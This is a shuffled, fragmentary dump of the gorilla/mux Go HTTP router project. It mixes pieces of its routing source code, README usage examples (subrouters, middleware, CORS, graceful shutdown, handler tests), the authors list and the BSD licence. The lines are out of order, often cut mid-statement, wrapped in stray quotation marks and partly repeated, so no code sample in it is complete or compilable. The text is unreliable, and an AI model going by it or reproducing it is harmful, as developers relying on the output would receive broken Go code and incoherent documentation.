"c.matchers = append(c.matchers, m)"
// Manager for the variables from host and path.
 ok {
if r.regexp.path != nil {
"// When there is a match, the route variables can be retrieved calling"
// MatchErr is set to appropriate matching error
"// When false, the path will be cleaned, so /fetch/http://xkcd.com/534/ will"
import (
if values := toMatch[k]
r.strictSlash = value
Router) MatcherFunc(f MatcherFunc) 
// This matches with fix in go 1.2 r.c. 4 for same problem.  Go Issue:
func setCurrentRoute(r 
//     }
for i := 0
// Match attempts to match the given request against the router's registered routes.
// mux.Vars(request).
"w.Header().Set(""Location"", p)"
Route)}
useEncodedPath bool
func NewRouter() 
// See Route.Path() and Route.HandlerFunc().
"Router) Handle(path string, handler http.Handler) "
"err := walkFn(t, r, ancestors)"
"// It implements the http.Handler interface, so it can be registered to serve"
"// (eg: not found) has a registered handler, the handler is assigned to the Handler"
c.regexp.queries = make([]
Route   
// ServeHTTP dispatches the handler registered in the matched route.
"var SkipRouter = errors.New(""skip this router"")"
"func mapFromPairsToString(pairs ...string) (map[string]string, error) {"
"p = ""/"" "
r.skipClean = value
Route) error
m := make(map[string]
routes []
handler = match.Handler
if r.regexp.host != nil {
"for _, m := range r.matchers {"
return np
 i < length
// Schemes registers a new route with a matcher for URL schemes.
match.MatchErr = ErrNotFound
// Build middleware chain if no error was found
"for _, sr := range t.matchers {"
route := 
return r.NewRoute().Host(tpl)
return
Handler http.Handler
Vars    map[string]string
"// CurrentRoute returns the matched route for the current request, if any."
"m := make(map[string]string, length/2)"
http.Request {
"http.Request, key, val interface{}) "
package mux
import (
"http.Request, key interface{}) interface{} {"
"return r.WithContext(context.WithValue(r.Context(), key, val))"
if val == nil {
func contextGet(r 
return r.Context().Value(key)
"""net/http"""
func contextSet(r 
return r
"""context"""
    // A route with a route variable:
bash
"mux.Router, ancestors []"
"< Date: Fri, 28 Jun 2019 20:13:30 GMT"
// endpoints.go
...and the result will be a 
        // Good practice: enforce timeouts for servers you create!
        
"And if you use subrouters, host and path defined separately can be built as well:"
""". This makes it easy to serve static files with mux:"
// endpoints_test.go
RouteMatch) bool {
the following prints all of the registered routes:
 Graceful Shutdown
"    req, err := http.NewRequest(""GET"", ""/health"", nil)"
"    ""testing"""
"// ""http://news.example.com/articles/technology/42"""
 The middleware will set the 
"    r.HandleFunc(""/products"", ProductsHandler)"
mux.Vars()
fmt.Println(err)
"dir, ""dir"", ""."", ""the directory to serve files from. Defaults to the current dir"")"
"    http.Handle(""/"", r)"
Access-Control-Allow-Methods
"    ""log"""
    }()
"url, err := r.Get(""article"").URL(""category"", ""technology"", ""id"", ""42"")"
OPTIONS
"host, err := r.Get(""article"").URLHost(""subdomain"", ""news"")"
Would look like:
"queriesTemplates, err := route.GetQueriesTemplates()"
"  Queries(""filter"", ""{filter}"")."
"s.HandleFunc(""/products/"", ProductsHandler)"
handling-cors-requests)
"  Host(""www.example.com"")."
"r.HandleFunc(""/products"", ProductsHandler)."
 Static Files
< Access-Control-Allow-Origin: 
    var dir string
 [Testing Handlers](
testing-handlers)
"s.HandleFunc(""/products/{key}"", ProductHandler)"
"    r.PathPrefix(""/static/"").Handler(http.StripPrefix(""/static/"", http.FileServer(http.Dir(dir))))"
"pathTemplate, err := route.GetPathTemplate()"
"n"", user)"
"r.Headers(""X-Requested-With"", ""XMLHttpRequest"")"
"First, our simple HTTP handler:"
    if status := rr.Code
registered-urls)
"        Addr:         ""127.0.0.1:8000"","
        ReadTimeout:  time.Second 
"// ""/products/"""
"    ctx, cancel := context.WithTimeout(context.Background(), wait)"
func main() {
func (amw 
https://www.gorillatoolkit.org/pkg/mux
 Connection 
"r.HandleFunc(""/articles/{category}/"", ArticlesCategoryHandler)"
 as well as 
"    r.HandleFunc(""/"", HomeHandler)"
status.svg)](https://godoc.org/github.com/gorilla/mux)
"http.Error(w, ""Forbidden"", http.StatusForbidden)"
"    // Create a request to pass to our handler. We don't have any query parameters for now, so we'll"
"url, err := r.Get(""article"").URL(""subdomain"", ""news"","
In the case that our routes have [variables](
"r.Host(""{subdomain}.example.com"")."
"Access-Control-Allow-Methods: GET,PUT,OPTIONS"
"fmt.Println(""Path regexp:"", pathRegexp)"
 matches incoming requests against a list of registered routes and calls a handler for the route that matches the URL or other conditions. The main features are:
"r.HeadersRegexp(""Content-Type"", ""application/(text"
amw.Populate()
 License
" works: if an incoming request URL matches one of the paths, the corresponding handler is called passing ("
endpoints.go
BSD licensed. See the LICENSE file for details.
 [Registered URLs](
[![GoDoc](https://godoc.org/github.com/gorilla/mux
" URL hosts, paths and query values can have variables with an optional regular expression."
"func ArticlesCategoryHandler(w http.ResponseWriter, r "
"    ""os"""
[![Sourcegraph](https://sourcegraph.com/github.com/gorilla/mux/-/badge.svg)](https://sourcegraph.com/github.com/gorilla/mux
"amw.tokenUsers[""05f717e5""] = ""randomUser"""
    // Check the response body is what we expect.
"wait, ""graceful-timeout"", time.Second "
"...and finally, it is possible to combine several matchers in a single route:"
type MiddlewareFunc func(http.Handler) http.Handler
/foo
graceful-shutdown)
    os.Exit(0)
 hijacking.
        shouldPass bool
"                                 ""id"", ""42"","
    var wait time.Duration
    log.Fatal(srv.ListenAndServe())
r := mux.NewRouter()
And an request to 
 You will still need to use your own CORS handler to set the other CORS headers such as 
    r := mux.NewRouter()
"Routes are tested in the order they were added to the router. If two routes match, the first one wins:"
"        t.Errorf(""handler returned wrong status code: got %v want %v"","
"http.Handle(""/"", r)"
< HTTP/1.1 200 OK
their respective handler.
"        {""queries"", true},"
Here we register three routes mapping URL paths to handlers. This is equivalent to how 
"                                 ""filter"", ""gorilla"")"
        }
    
go get -u github.com/gorilla/mux
"        path := fmt.Sprintf(""/metrics/%s"", tc.routeVariable)"
"  Name(""article"")"
endpoints_test.go
if err == nil {
 Examples
    return r.ProtoMajor == 0
"// url.String() will be ""http://news.example.com/articles/technology/42"
        if err != nil {
www.example.com
" if they _are_ going to terminate the request, and they _should not_ write to "
routeVariables
    // Create a deadline to wait for.
    // We create a ResponseRecorder (which satisfies http.ResponseWriter) to record the response.
"The name mux stands for ""HTTP request multiplexer"". Like the standard "
fmt.Println()
"    signal.Notify(c, os.Interrupt)"
". If a regular expression pattern is not defined, the matched variable will be anything until the next slash. For example:"
"r.Queries(""key"", ""value"")"
"                                 ""category"", ""technology"","
    // until the timeout deadline.
 Handling CORS Requests
Access-Control-Allow-Origin
Mux supports the addition of middlewares to a [Router](https://godoc.org/github.com/gorilla/mux
"path, err := r.Get(""article"").URLPath(""category"", ""technology"", ""id"", ""42"")"
    // A very simple health check.
"r.Methods(""GET"", ""POST"")"
"next.ServeHTTP(w, r)"
"    w.Header().Set(""Access-Control-Allow-Origin"", """
"""strings"""
        return
func TestHealthCheckHandler(t 
Name()
"    ""context"""
r.MatcherFunc(func(r 
    go func() {
...or HTTP methods:
"    for _, tc := range tt {"
router := mux.NewRouter()
"r.HandleFunc(""/specific"", specificHandler)"
"Setting the same matching conditions again and again can be boring, so we have a way to group several routes that share the same requirements. We call it ""subrouting""."
"r.HandleFunc(""/authors"", handler).Queries(""surname"", ""{surname}"")"
"Testing handlers in a Go web application is straightforward, and _mux_ doesn't complicate this any further. Given two files: "
testing) Go toolchain:
    // Check the status code is what we expect.
"Subrouters can be used to create domain or path ""namespaces"": you define subrouters in a central place and then parts of the app can register its paths relatively to a given subrouter."
"For example, let's say we have several URLs that should only match when the host is "
 status != http.StatusOK {
// Write an error and stop the handler chain
    // We'll accept graceful shutdowns when quit via SIGINT (Ctrl
"// ""/products/{key}/"""
[![CircleCI](https://circleci.com/gh/gorilla/mux.svg
The names are used to create a map of route variables which can be retrieved calling 
"    w.Header().Set(""Content-Type"", ""application/json"")"
"    log.Fatal(http.ListenAndServe("":8000"", r))"
url.URL
"// ""/products/{key}/details"""
"r.HandleFunc(""/"", handler)"
    // Routes consist of a path and a handler function.
type authenticationMiddleware struct {
if err != nil {
    // Add your routes as needed
Walk
http.Server{
        WriteTimeout: 15 
http_shutdown) a 
"    ""github.com/gorilla/mux"""
"""fmt"""
"request that matches ""/static/"
"        if user, found := amw.tokenUsers[token]"
"Our test file, with a table-driven test of "
"func fooHandler(w http.ResponseWriter, r "
> Accept: 
"    log.Println(""shutting down"")"
 with the corresponding parameters. This can be used to abort a request if the middleware writer wants to. Middlewares _should_ write to 
PathPrefix()
 [Examples](
 method matcher for the middleware to set the headers.
"    // Our handlers satisfy http.Handler, so we can call their ServeHTTP method"
"queriesRegexps, err := route.GetQueriesRegexp()"
...or header values:
"        {""heap"", true},"
    tt := []struct{
    // <-ctx.Done() if your application should wait for other services
 [Walking Routes](
[table-driven tests](https://dave.cheney.net/2013/06/09/writing-table-driven-tests-in-go) to test multiple
"    ""net/http/httptest"""
"r.Host(""www.example.com"")"
"r.PathPrefix(""/"").Handler(catchAllHandler)"
There's also a way to build only the URL host or path for a route: use the methods 
  HandlerFunc(ArticleHandler).
        IdleTimeout:  time.Second 
    // IMPORTANT: you must specify an OPTIONS method matcher for the middleware to set CORS headers
    if r.Method == http.MethodOptions {
"func HealthCheckHandler(w http.ResponseWriter, r "
Let's start registering a couple of URL paths and handlers:
"        token := r.Header.Get(""X-Session-Token"")"
 TCP_NODELAY set
Now let's see how to build registered URLs.
". Create a route for that host and get a ""subrouter"" from it:"
[![Build Status](https://travis-ci.org/gorilla/mux.svg
"                tc.routeVariable, rr.Code, http.StatusOK)"
 and 
"    // (e.g. Redis) by performing a simple PING, and include them in the response."
"s := r.Host(""www.example.com"").Subrouter()"
        // for a route variable it doesn't know about.
" 60,"
"        router.ServeHTTP(rr, req)"
 [Matching Routes](
 !tc.shouldPass {
< Content-Length: 3
) as parameters.
    handler := http.HandlerFunc(HealthCheckHandler)
There are several other matchers that can be added. To match path prefixes:
URLHost()
http.Request) {
 [Static Files](
"        Handler:      r,"
[CORSMethodMiddleware](https://godoc.org/github.com/gorilla/mux
"// ""http://news.example.com/"""
"r.HandleFunc(""/articles/{id}"", handler).Methods(""GET"", ""PUT"")"
"    r.HandleFunc(""/metrics/{type}"", MetricsHandler)"
> GET /foo HTTP/1.1
"    r.HandleFunc(""/"", YourHandler)"
"// Only matches if domain is ""www.example.com""."
"There's one more thing about subroutes. When a subrouter has a path prefix, the inner routes use it as base for their paths:"
middleware)
 -> 
"        {""adhadaeqm3k"", false},"
branch=master)](https://travis-ci.org/gorilla/mux)
"    r.HandleFunc(""/health"", HealthCheckHandler)"
 Testing Handlers
 function on 
"r.HandleFunc(""/articles/{category}/{id:[0-9]"
 on a route. For example:
Note: The handler chain will be stopped if your middleware doesn't call 
"r.PathPrefix(""/products/"")"
> Host: localhost:8080
"n"", vars[""category""])"
"    fmt.Fprintf(w, ""Category: %v"
Routes can also be restricted to a domain or subdomain. Just define a host pattern to be matched. They can also have variables:
"    r.HandleFunc(""/articles"", ArticlesHandler)"
 Full Example
"fmt.Println(""Queries regexps:"", strings.Join(queriesRegexps, "",""))"
possible route variables as needed.
amw := authenticationMiddleware{}
    // This will serve files under http://localhost:8000/static/<filename>
"Here's a complete, runnable example of a small "
The three URL paths we registered above will only be tested if the domain is 
" can be used to visit all of the routes that are registered on a router. For example,"
    if rr.Body.String() != expected {
The 
"s.HandleFunc(""/articles/{category}/{id:[0-9]"
next.ServeHTTP()
"fmt.Println(""Methods:"", strings.Join(methods, "",""))"
"    ""flag"""
ResponseWriter
        t.Fatal(err)
    rr := httptest.NewRecorder()
"        router.HandleFunc(""/metrics/{type}"", MetricsHandler)"
            log.Println(err)
"        next.ServeHTTP(w, r)"
http.Server
    flag.DurationVar(
" 15,"
Middlewares can be added to a router using 
// Define our struct
 Registered URLs
"r.HandleFunc(""/products/{key}"", ProductHandler)"
"}"", ArticleHandler)"
    w.WriteHeader(http.StatusOK)
"examples), we can pass those in the request. We could write"
"    w.Write([]byte(""foo""))"
"        // Call the next handler, which can be another middleware in the chain, or the final handler."
 err != nil {
"< Access-Control-Allow-Methods: GET,PUT,PATCH,OPTIONS"
{name}
    vars := mux.Vars(r)
// Need to create a router that we can pass the request through so that the vars will be added to the context
    // directly and pass in our Request and ResponseRecorder.
...or URL schemes:
"log.Printf(""Authenticated user %s"
    srv := 
"amw.tokenUsers[""00000000""] = ""user0"""
"  Methods(""GET"")."
    }
"""net/http"""
static-files)
> _Important_: there must be an 
" Routes can be used as subrouters: nested routes are only tested if the parent route matches. This is useful to define groups of routes that share common conditions like a host, a path prefix or other repeated attributes. As a bonus, this optimizes request matching."
"s.HandleFunc(""/{key}/details"", ProductDetailsHandler)"
"            t.Errorf(""handler should have failed on routeVariable %s: got %v want %v"","
Our test code:
 It implements the 
"All variables defined in the route are required, and their values must conform to the corresponding patterns. These requirements guarantee that a generated URL will always match a registered route -- the only exception is for explicitly defined ""build-only"" routes which never match."
Mux middlewares are defined using the de facto standard type:
"    // In the future we could report back on the status of our DB, or our cache"
    expected := 
// We found the token in our map
            t.Fatal(err)
 found {
mux.Route) error {
 implements a request router and dispatcher for matching incoming requests to
"PathPrefix(""/static/"").Handler(...)"
"    ""os/signal"""
"    // SIGKILL, SIGQUIT or SIGTERM (Ctrl"
"s := r.PathPrefix(""/products"").Subrouter()"
" instead. For the previous route, we would do:"
"amw.tokenUsers[""deadbeef""] = ""user0"""
 [Handling CORS Requests](
"Regex support also exists for matching Headers within a route. For example, we could do:"
authenticationMiddleware) Populate() {
"        Addr:         ""0.0.0.0:8080"","
http.ServeMux
http.Handler
 or 
This also works for host and query value variables:
 means that the handler will be passed any
"r.Schemes(""https"")"
"        Handler: r, // Pass our instance of gorilla/mux in."
", here's how we'd test an application using _mux_."
"Middlewares are (typically) small pieces of code which take one request, do something with it, and pass it down to another middleware or the final handler. Some common use cases for middleware are request logging, header manipulation, or "
"func handler(w http.ResponseWriter, r "
 header to all the method matchers (e.g. 
    // Bind to a port and pass our router in
"        // In this case, our MetricsHandler returns a non-200 response"
gorilla/mux
curl localhost:8080/foo -v
0 to host localhost left intact
"""github.com/gorilla/mux"""
Paths can have variables. They are defined using the format 
"            status, http.StatusOK)"
{name:pattern}
" 15, ""the duration for which the server gracefully wait for existing connections to finish - e.g. 15s or 1m"")"
// Matches a dynamic subdomain.
        ReadTimeout:  15 
) on a route
"Router), which are executed in the order they are added if a match is found, including its subrouters."
"r.HandleFunc(""/products"", handler).Methods(""POST"")"
func TestMetricsHandler(t 
"                                 ""id"", ""42"")"
http.ResponseWriter
Router.Use()
    if err != nil {
"    c := make(chan os.Signal, 1)"
"// ""/articles/technology/42"""
...and the route will match both requests with a Content-Type of 
badge)
Package 
"amw.tokenUsers[""aaaaaaaa""] = ""userA"""
package main
" method, passing a sequence of key/value pairs for the route variables. For the previous route, we would do:"
testing.T) {
examples)
"}"")."
    <-c
application/json
 Middleware
 [Graceful Shutdown](
    // Run our server in a goroutine so that it doesn't block.
 charset=utf-8
authenticationMiddleware) Middleware(next http.Handler) http.Handler {
application/text
return nil
    // Block until we receive our signal.
"    log.Fatal(http.ListenAndServe(""localhost:8080"", r))"
"s.HandleFunc(""/{key}/"", ProductHandler)"
And this is all you need to know about the basic usage. More advanced options are explained below.
" Registered URLs can be built, or ""reversed"", which helps maintaining references to resources."
"fmt.Println(""Queries templates:"", strings.Join(queriesTemplates, "",""))"
Here is an example of using 
http.HandleFunc()
"pathRegexp, err := route.GetPathRegexp()"
    })
With a [correctly configured](https://golang.org/doc/install
"// Middleware function, which will be called for each request"
"        req, err := http.NewRequest(""GET"", path, nil)"
        log.Println(r.RequestURI)
err := r.Walk(func(route 
" time.Second,"
        // Do stuff here
"mux.Route, router "
        // Good practice to set timeouts to avoid Slowloris attacks.
    }{
" Requests can be matched based on URL host, path, path prefix, schemes, header and query values, HTTP methods or using custom matchers."
"    http.ListenAndServe("":8080"", r)"
"s := r.Host(""{subdomain}.example.com"").Subrouter()"
matching-routes)
Then register routes in the subrouter:
"    handler.ServeHTTP(rr, req)"
 with the following path:
"filter=gorilla"""
CORSMethodMiddleware
r.Use(amw.Middleware)
Note that the path provided to 
"    ""net/http"""
    flag.Parse()
" If you do not specify any methods, then:"
"http.Request, rm "
"A more complex authentication middleware, which maps session token to users, could be written as:"
URL()
"        {""goroutines"", true},"
"}"", ArticleHandler)."
    defer cancel()
"    // Optionally, you could run srv.Shutdown in a goroutine and block on"
r.Use(loggingMiddleware)
 if they _are not_ going to terminate it.
> User-Agent: curl/7.59.0
", because the subrouter is tested first. This is not only convenient, but also optimizes request matching. You can create subrouters combining any attribute matchers accepted by a route."
"  Path(""/articles/{category}/{id:[0-9]"
![Gorilla Logo](http://www.gorillatoolkit.org/static/images/gorilla-icon-64.png)
"""/articles/technology/42"""
"s.HandleFunc(""/"", ProductsHandler)"
    // pass 'nil' as the third parameter.
/) will not be caught.
 [Full Example](
" represents a ""wildcard"": calling"
tokenUsers map[string]string
style=svg)](https://circleci.com/gh/gorilla/mux)
"        t.Errorf(""handler returned unexpected body: got %v want %v"","
A very basic middleware which logs the URI of the request being handled could be written as:
    flag.StringVar(
import (
"}.example.com"")"
< Content-Type: text/plain
full-example)
    r.Use(mux.CORSMethodMiddleware(r))
 along with a custom 
"    w.Write([]byte(""Gorilla!"
    // to finalize based on context cancellation.
"    // Doesn't block if no connections, but will otherwise wait"
"s.Path(""/articles/{category}/{id:[0-9]"
 using something like:
"r.Methods(http.MethodGet, http.MethodPut, http.MethodOptions)"
"n""))"
 Install
 based server:
walking-routes)
        WriteTimeout: time.Second 
   Trying ::1...
"Routes can be named. All routes that define a name can have their URLs built, or ""reversed"". We define a name calling "
        } else {
 response header.
// Initialize it somewhere
 handler to set all the required CORS headers:
"    io.WriteString(w, "
"  Schemes(""http"")"
"    return http.HandlerFunc(func(w http.ResponseWriter, r "
"func YourHandler(w http.ResponseWriter, r "
"        {""counters"", true},"
"json)"")"
        routeVariable string
 Connected to localhost (::1) port 8080 (
 [Middleware](
mux.Router
"r.HandleFunc(""/articles"", handler).Methods(""GET"")"
 [Install](
"methods, err := route.GetMethods()"
URLPath()
. Here's how to do that alongside 
        rr := httptest.NewRecorder()
 Matching Routes
        if err := srv.ListenAndServe()
"To build a URL, get the route and call the "
...or query values:
"{""alive"": true}"
    srv.Shutdown(ctx)
...or to use a custom matcher function:
"    ""time"""
"Typically, the returned handler is a closure which does something with the http.ResponseWriter and http.Request passed to it, and then calls the handler passed as parameter to the MiddlewareFunc. This takes advantage of closures being able access variables from the context where they are created, while retaining the signature enforced by the receivers."
http.Request
func loggingMiddleware(next http.Handler) http.Handler {
Go 1.8 introduced the ability to [gracefully shutdown](https://golang.org/doc/go1.8
"    r.HandleFunc(""/foo"", fooHandler).Methods(http.MethodGet, http.MethodPut, http.MethodPatch, http.MethodOptions)"
 gorilla/mux
"fmt.Println(""ROUTE:"", pathTemplate)"
        if rr.Code == http.StatusOK 
 Walking Routes
// Pass down the request to the next middleware (or final handler)
return
 interface so it is compatible with the standard 
"            rr.Body.String(), expected)"
install)
CORSMethodMiddleware) intends to make it easier to strictly set the 
"r.Host(""{subdomain:[a-z]"
Google LLC (https://opensource.google.com/)
 This is the official list of gorilla/mux authors for copyright purposes.
Kamil Kisielk <kamil@kamilkisiel.net>
Rodrigo Moraes (https://github.com/moraes)
 Please keep the list sorted.
Matt Silverlock <matt@eatsleeprepeat.net>
 OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
this software without specific prior written permission.
"LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR"
 Redistributions in binary form must reproduce the above
"DATA, OR PROFITS"
 Neither the name of Google Inc. nor the names of its
"modification, are permitted provided that the following conditions are"
" LOSS OF USE,"
"Redistribution and use in source and binary forms, with or without"
"OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
"""AS IS"" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT"
"OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,"
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
"THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT"
"notice, this list of conditions and the following disclaimer."
"copyright notice, this list of conditions and the following disclaimer"
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT"
Copyright (c) 2012-2018 The Gorilla Authors. All rights reserved.
"LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES"
in the documentation and/or other materials provided with the
met:
 Redistributions of source code must retain the above copyright
distribution.
contributors may be used to endorse or promote products derived from
"Mux supports the addition of middlewares to a Router, which are executed in the order they are added if a match is found, including its subrouters. Middlewares are (typically) small pieces of code which take one request, do something with it, and pass it down to another middleware or the final handler. Some common use cases for middleware are request logging, header manipulation, or ResponseWriter hijacking."
"There's one more thing about subroutes. When a subrouter has a path prefix,"
"one of the paths, the corresponding handler is called passing"
"// ""http://news.domain.com/"""
"}"")."
"r.HandleFunc(""/articles/{category}/{id:[0-9]"
The names are used to create a map of route variables which can be retrieved
application/json
"r.PathPrefix(""/products/"")"
Note: The handler chain will be stopped if your middleware doesn't call 
""". This makes it easy to serve static files with mux:"
authenticationMiddleware) Middleware(next http.Handler) http.Handler {
RouteMatch) bool {
application/text
 as well as
"Addr:         ""127.0.0.1:8000"","
There's also a way to build only the URL host or path for a route:
conform to the corresponding patterns. These requirements guarantee that a
"s.HandleFunc(""/{key}/"", ProductHandler)"
"Groups can be used inside patterns, as long as they are non-capturing ("
log.Println(r.RequestURI)
"token := r.Header.Get(""X-Session-Token"")"
:asc
"r.Queries(""key"", ""value"")"
"r.HandleFunc(""/"", HomeHandler)"
"Note that the path provided to PathPrefix() represents a ""wildcard"": calling"
"                                 ""category"", ""technology"","
"dir, ""dir"", ""."", ""the directory to serve files from. Defaults to the current dir"")"
when capturing groups were present.
"We call it ""subrouting""."
The three URL paths we registered above will only be tested if the domain is
"this, convert any capturing groups to non-capturing, e.g. change ""/{sort:(asc"
we would do:
func simpleMw(next http.Handler) http.Handler {
as well:
r.Use(simpleMw)
"url, err := r.Get(""article"").URL(""category"", ""technology"", ""id"", ""42"")"
"// Middleware function, which will be called for each request"
"Typically, the returned handler is a closure which does something with the http.ResponseWriter and http.Request passed to it, and then calls the handler passed as parameter to the MiddlewareFunc (closures can access variables from the context where they are created)."
package mux
"host, err := r.Get(""article"").URLHost(""subdomain"", ""news"")"
"path, err := r.Get(""article"").URLPath(""category"", ""technology"", ""id"", ""42"")"
flag.Parse()
 It implements the http.Handler interface so it is compatible with the
" time.Second,"
"r.Methods(""GET"", ""POST"")"
"next.ServeHTTP(w, r)"
Here we register three routes mapping URL paths to handlers. This is
"s.HandleFunc(""/articles/{category}/{id:[0-9]"
// Good practice: enforce timeouts for servers you create!
"desc)}"" to"
ReadTimeout:  15 
variable will be anything until the next slash. For example:
" Requests can be matched based on URL host, path, path prefix, schemes,"
next.ServeHTTP()
...and the result will be a url.URL with the following path:
// Copyright 2012 The Gorilla Authors. All rights reserved.
"r.PathPrefix(""/static/"").Handler(http.StripPrefix(""/static/"", http.FileServer(http.Dir(dir))))"
"  Queries(""filter"", ""{filter}"")."
"s.HandleFunc(""/products/"", ProductsHandler)"
"r.HandleFunc(""/articles"", ArticlesHandler)"
// Do stuff here
or other conditions. The main features are:
"  Host(""www.example.com"")."
r.MatcherFunc(func(r 
"r.Host(""{subdomain}.domain.com"")."
...or HTTP methods:
Then register routes in the subrouter:
"for explicitly defined ""build-only"" routes which never match."
"log.Printf(""Authenticated user %s"
"r.HandleFunc(""/products"", ProductsHandler)."
" URL hosts, paths and query values can have variables with an optional"
"r.HandleFunc(""/products"", ProductsHandler)"
"s.HandleFunc(""/products/{key}"", ProductHandler)"
"filter=gorilla"""
r.Use(amw.Middleware)
"To build a URL, get the route and call the URL() method, passing a sequence of"
"n"", user)"
http.Request) as parameters.
Middlewares can be added to a router using 
Routes can also be restricted to a domain or subdomain. Just define a host
 Routes can be used as subrouters: nested routes are only tested if the
registered routes and calls a handler for the route that matches the URL
"r.Headers(""X-Requested-With"", ""XMLHttpRequest"")"
// Define our struct
"http.Request, rm "
"r.HandleFunc(""/products/{key}"", ProductHandler)"
"A more complex authentication middleware, which maps session token to users, could be written as:"
"// ""/products/{key}/"""
"}"", ArticleHandler)"
"  share common conditions like a host, a path prefix or other repeated"
"}"", ArticleHandler)."
paths relatively to a given subrouter.
// license that can be found in the LICENSE file.
"or ""reversed"". We define a name calling Name() on a route. For example:"
"// url.String() will be ""http://news.domain.com/articles/technology/42"
"And if you use subrouters, host and path defined separately can be built"
} else {
return r.ProtoMajor == 0
"Subrouters can be used to create domain or path ""namespaces"": you define"
"// ""/products/"""
"(http.ResponseWriter, "
are explained below.
...or URL schemes:
"// ""/products/{key}/details"""
func main() {
"  Path(""/articles/{category}/{id:[0-9]"
"PathPrefix(""/static/"").Handler(...) means that the handler will be passed any"
"r.HandleFunc(""/"", handler)"
"amw.tokenUsers[""00000000""] = ""user0"""
func (amw 
"""/articles/technology/42"""
amw := authenticationMiddleware{tokenUsers: make(map[string]string)}
"  Methods(""GET"")."
"s.HandleFunc(""/"", ProductsHandler)"
type authenticationMiddleware struct {
"Setting the same matching conditions again and again can be boring, so we have"
"host is ""www.example.com"". Create a route for that host and get a ""subrouter"""
"The name mux stands for ""HTTP request multiplexer"". Like the standard"
"r.HandleFunc(""/articles/{category}/"", ArticlesCategoryHandler)"
tokenUsers map[string]string
http.Server{
equivalent to how http.HandleFunc() works: if an incoming request URL matches
A very basic middleware which logs the URI of the request being handled could be written as:
  standard http.ServeMux.
"s.HandleFunc(""/{key}/details"", ProductDetailsHandler)"
"request that matches ""/static/"
desc
  references to resources.
"""www.example.com"", because the subrouter is tested first. This is not"
"""/{sort:("
log.Fatal(srv.ListenAndServe())
:re). For example:
And this is all you need to know about the basic usage. More advanced options
"http.Error(w, ""Forbidden"", http.StatusForbidden)"
"All variables defined in the route are required, and their values must"
"s.Path(""/articles/{category}/{id:[0-9]"
// We found the token in our map
"  attributes. As a bonus, this optimizes request matching."
" Registered URLs can be built, or ""reversed"", which helps maintaining"
"Routes can be named. All routes that define a name can have their URLs built,"
"url, err := r.Get(""article"").URL(""subdomain"", ""news"","
"  header and query values, HTTP methods or using custom matchers."
the inner routes use it as base for their paths:
 found {
"use the methods URLHost() or URLPath() instead. For the previous route,"
"s := r.PathPrefix(""/products"").Subrouter()"
"r.HeadersRegexp(""Content-Type"", ""application/(text"
amw.Populate()
flag.StringVar(
"key/value pairs for the route variables. For the previous route, we would do:"
"amw.tokenUsers[""deadbeef""] = ""user0"""
...or header values:
"Regex support also exists for matching Headers within a route. For example, we could do:"
pattern to be matched. They can also have variables:
authenticationMiddleware) Populate() {
"only convenient, but also optimizes request matching. You can create"
vars := mux.Vars(request)
// Initialize it somewhere
subrouters combining any attribute matchers accepted by a route.
Paths can have variables. They are defined using the format {name} or
"new)}"", ArticlesCategoryHandler)"
"  Schemes(""http"")"
"amw.tokenUsers[""05f717e5""] = ""randomUser"""
This also works for host and query value variables:
"r.Host(""www.example.com"")"
  HandlerFunc(ArticleHandler).
"// Call the next handler, which can be another middleware in the chain, or the final handler."
 with the corresponding parameters. This can be used to abort a request if the middleware writer wants to.
"json)"")"
Let's start registering a couple of URL paths and handlers:
"r.Schemes(""https"")"
"...and finally, it is possible to combine several matchers in a single route:"
"category := vars[""category""]"
"}""), ArticleHandler)"
"desc)}"". This is a change from prior versions which behaved unpredictably"
type MiddlewareFunc func(http.Handler) http.Handler
WriteTimeout: 15 
Now let's see how to build registered URLs.
"// ""http://news.domain.com/articles/technology/42"""
"{name:pattern}. If a regular expression pattern is not defined, the matched"
Package mux implements a request router and dispatcher.
"                                 ""id"", ""42"","
r := mux.NewRouter()
a way to group several routes that share the same requirements.
  regular expression.
calling mux.Vars():
...or query values:
// This will serve files under http://localhost:8000/static/<filename>
...or to use a custom matcher function:
from it:
  parent route matches. This is useful to define groups of routes that
"s := r.Host(""www.example.com"").Subrouter()"
subrouters in a central place and then parts of the app can register its
// Matches a dynamic subdomain.
There are several other matchers that can be added. To match path prefixes:
"http.ServeMux, mux.Router matches incoming requests against a list of"
"Handler:      r,"
generated URL will always match a registered route -- the only exception is
"http.Handle(""/"", r)"
// Use of this source code is governed by a BSD-style
http.Request) {
"For example, let's say we have several URLs that should only match when the"
"r.HandleFunc(""/articles/{category}/{sort:("
"}.domain.com"")"
"if user, found := amw.tokenUsers[token]"
"return http.HandlerFunc(func(w http.ResponseWriter, r "
"                                 ""id"", ""42"")"
srv := 
"s := r.Host(""{subdomain}.domain.com"").Subrouter()"
Router.Use()
var dir string
"// ""/articles/technology/42"""
"// Only matches if domain is ""www.example.com""."
...and the route will match both requests with a Content-Type of 
"                                 ""filter"", ""gorilla"")"
"Note that if any capturing groups are present, mux will panic() during parsing. To prevent"
"amw.tokenUsers[""aaaaaaaa""] = ""userA"""
"  Name(""article"")"
"r.Host(""{subdomain:[a-z]"
"if matched := m.Match(req, match)"
return r.Handler(http.HandlerFunc(f))
// An error will be returned if the route does not define queries.
"Route) GetQueriesTemplates() ([]string, error) {"
match.Route = r
"if _, ok := m.(methodMatcher)"
"return matchInArray(m, r.Method)"
"// template must start with a ""/""."
"1], regexpTypeQuery)"
RouteMatch) bool {
"//     url, err := r.Get(""article"").URL(""subdomain"", ""news"","
if r.err != nil {
Route) Schemes(schemes ...string) 
length := len(pairs)
package mux
"""errors"""
http.Request)) 
router := 
"headers, r.err = mapFromPairsToRegex(pairs...)"
"return nil, errors.New(""mux: route doesn't have a host"")"
